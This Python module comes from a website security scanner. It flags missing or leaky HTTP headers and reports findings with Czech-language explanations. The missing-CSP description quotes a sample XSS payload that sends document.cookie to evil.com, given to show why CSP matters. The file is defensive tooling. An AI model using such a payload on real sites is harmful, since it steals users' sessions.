from .base import BaseScanModule, Finding, Severity


REQUIRED_HEADERS = [
    {
        "id": "missing-csp",
        "header": "content-security-policy",
        "title": "Chybí Content-Security-Policy",
        "description": "Bez CSP může útočník vložit na stránku vlastní JavaScript — např. přes komentář, formulář nebo URL parametr. Skript pak krade cookies, hesla nebo přesměruje uživatele. Příklad: útočník vloží <script>document.location='https://evil.com/?c='+document.cookie</script> a ukradne session.",
        "severity": Severity.CRITICAL,
        "ok_title": "Content-Security-Policy nastaven",
        "ok_description": "CSP header je přítomen.",
        "doc_url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP",
        "fix_url": "/guide/#http-security-headers",
    },
    {
        "id": "missing-hsts",
        "header": "strict-transport-security",
        "title": "Chybí HSTS header",
        "description": "Bez HSTS může útočník na veřejné Wi-Fi přesměrovat uživatele z HTTPS na HTTP a odposlouchávat komunikaci (SSL stripping). Prohlížeč bez HSTS neví, že má vždy vynutit HTTPS.",
        "severity": Severity.CRITICAL,
        "ok_title": "HSTS nastaven",
        "ok_description": "Strict-Transport-Security header je přítomen.",
        "doc_url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security",
        "fix_url": "/guide/#http-security-headers",
    },
    {
        "id": "missing-x-frame",
        "header": "x-frame-options",
        "title": "Chybí X-Frame-Options",
        "description": "Web může být vložen do iframe na útočníkově stránce. Útočník překryje tlačítka neviditelným rámcem a uživatel klikne na akci, kterou nevidí (clickjacking). Např. neviditelný iframe s tlačítkem 'Smazat účet'.",
        "severity": Severity.WARNING,
        "ok_title": "X-Frame-Options nastaven",
        "ok_description": "X-Frame-Options header je přítomen.",
        "doc_url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options",
        "fix_url": "/guide/#http-security-headers",
    },
    {
        "id": "missing-xcto",
        "header": "x-content-type-options",
        "title": "Chybí X-Content-Type-Options",
        "description": "Prohlížeč může 'hádat' typ souboru a spustit nebezpečný obsah. Např. obrázek obsahující JavaScript se spustí jako skript (MIME sniffing). Header 'nosniff' tohle zabrání.",
        "severity": Severity.WARNING,
        "ok_title": "X-Content-Type-Options nastaven",
        "ok_description": "nosniff header je přítomen.",
        "doc_url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options",
        "fix_url": "/guide/#http-security-headers",
    },
    {
        "id": "missing-referrer",
        "header": "referrer-policy",
        "title": "Chybí Referrer-Policy",
        "description": "Prohlížeč posílá plnou URL v Referer hlavičce. Pokud URL obsahuje tokeny nebo ID (např. /reset-password?token=abc123), únik na třetí stranu přes externí odkaz.",
        "severity": Severity.WARNING,
        "ok_title": "Referrer-Policy nastavena",
        "ok_description": "Referrer-Policy header je přítomen.",
        "doc_url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy",
        "fix_url": "/guide/#http-security-headers",
    },
    {
        "id": "missing-permissions",
        "header": "permissions-policy",
        "title": "Chybí Permissions-Policy",
        "description": "Bez Permissions-Policy může jakýkoliv iframe nebo skript na stránce požádat o přístup ke kameře, mikrofonu, geolokaci. Header omezí tyto API jen na to co skutečně potřebuješ.",
        "severity": Severity.WARNING,
        "ok_title": "Permissions-Policy nastavena",
        "ok_description": "Permissions-Policy header je přítomen.",
        "doc_url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy",
        "fix_url": "/guide/#http-security-headers",
    },
]


class HeaderScanner(BaseScanModule):
    name = "headers"
    step_label = "HTTP hlavičky"

    def run(self, url: str, response=None) -> list[Finding]:
        findings = []
        headers = {k.lower(): v for k, v in (response.headers if response else {}).items()}

        for check in REQUIRED_HEADERS:
            if check["header"] not in headers:
                findings.append(Finding(
                    id=check["id"],
                    title=check["title"],
                    description=check["description"],
                    severity=check["severity"],
                    category="headers",
                    fix_url=check.get("fix_url", "/guide/"),
                    doc_url=check.get("doc_url"),
                ))
            else:
                findings.append(Finding(
                    id=f"{check['id']}-ok",
                    title=check["ok_title"],
                    description=check["ok_description"],
                    severity=Severity.OK,
                    category="headers",
                ))

        # Server header leakage
        server = headers.get("server", "")
        if server and any(char.isdigit() for char in server):
            findings.append(Finding(
                id="server-leakage",
                title="Server header prozrazuje verzi",
                description=f"Header Server: {server} zbytečně odhaluje verzi software.",
                severity=Severity.WARNING,
                category="headers",
                detail=server,
            ))

        # X-Powered-By
        powered = headers.get("x-powered-by", "")
        if powered:
            findings.append(Finding(
                id="x-powered-by",
                title="X-Powered-By header přítomen",
                description=f"X-Powered-By: {powered} odhaluje použitý framework.",
                severity=Severity.WARNING,
                category="headers",
                detail=powered,
            ))

        # X-XSS-Protection (deprecated)
        xxss = headers.get("x-xss-protection", "")
        if xxss and not xxss.strip().startswith("0"):
            findings.append(Finding(
                id="xxss-protection-deprecated",
                title="X-XSS-Protection je zastaralý",
                description="X-XSS-Protection header je zastaralý a moderní prohlížeče ho ignorují. Může způsobit bezpečnostní problémy. Odeberte ho nebo nastavte na 0.",
                severity=Severity.INFO,
                category="headers",
                detail=xxss,
            ))

        # Cross-Origin-Opener-Policy
        if "cross-origin-opener-policy" not in headers:
            findings.append(Finding(
                id="missing-coop",
                title="Chybí Cross-Origin-Opener-Policy",
                description="Cross-Origin-Opener-Policy (COOP) chrání stránku před cross-origin útoky přes window reference. Doporučená hodnota: same-origin.",
                severity=Severity.INFO,
                category="headers",
            ))

        return findings
